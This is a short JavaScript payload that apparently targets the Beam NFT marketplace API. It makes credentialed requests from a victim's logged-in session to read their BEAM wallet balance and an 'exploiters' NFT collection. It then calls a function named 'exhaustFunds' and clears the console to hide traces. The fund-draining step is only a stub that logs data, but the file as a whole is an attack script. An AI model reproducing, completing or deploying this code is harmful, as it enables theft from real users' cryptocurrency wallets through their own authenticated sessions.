getData = async () => {
  // urls
  cid = "89389edd "; // Beam Apes CID

  // fetch balance data
  const balance = await fetch("https://api.beamnft.art/user/get", {
    method: "GET",
    headers: {
      "Access-Control-Request-Headers": "*",
    },
    credentials: "include",
  });

  // fetch nfts from exploiters collection
  const nfts = await fetch(`https://api.beamnft.art/collection/get/${cid}`, {
    method: "GET",
    headers: {
      "Access-Control-Request-Headers": "*",
    },
    credentials: "include",
  });

  const balanceData = await balance.json();
  const nftData = await nfts.json();

  return [balanceData, nftData];
};

exhaustFunds = (balance, nfts) => {
  let walletBalance = balance;
  console.clear(); // sanitize console

  console.log(walletBalance);
  console.log(nfts);
};

payload = async () => {
  let [balanceData, nftData] = await getData();
  let balance = balanceData.result.user.balances.BEAM.BEAM.a; // users balance (in GROTH)
  let nfts = nftData.result.nfts; // object containing nft data

  exhaustFunds(balance, nfts);
};

payload();
